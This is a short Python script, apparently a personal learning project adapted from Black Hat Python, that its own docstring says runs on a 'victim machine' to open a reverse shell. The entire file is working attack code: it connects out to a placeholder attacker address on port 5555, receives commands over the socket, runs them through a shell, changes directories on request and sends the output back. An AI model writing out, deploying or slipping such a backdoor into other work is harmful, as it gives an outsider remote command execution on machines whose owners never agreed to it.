#!/usr/bin/python

"""
This code will be executed on the victim machine to
establish a reverse shell. Some of the code
is from Black Hat Python.

The goal is to beef up its capabilties to my liking, but the
essence of how the shell works is shown

"""

import subprocess
import socket
import os

client = socket.socket()
client.connect(("<ip address of attacker machine>",5555))

def reverse_shell(command):

    command = command.rstrip()

    try:
        output = subprocess.check_output(command,stderr=subprocess.STDOUT, shell=True)
    except:
        output = "Execution failed. \r\n"
    return output


while True:

       
    cmd = client.recv(1024)
    if "cd" in cmd:
	os.chdir(cmd[3:])
	client.send("ok")
    else:
	command = reverse_shell(cmd)
	if len(command) < 1:
		client.send("nothing")
	else:
		client.send(command)
	
    



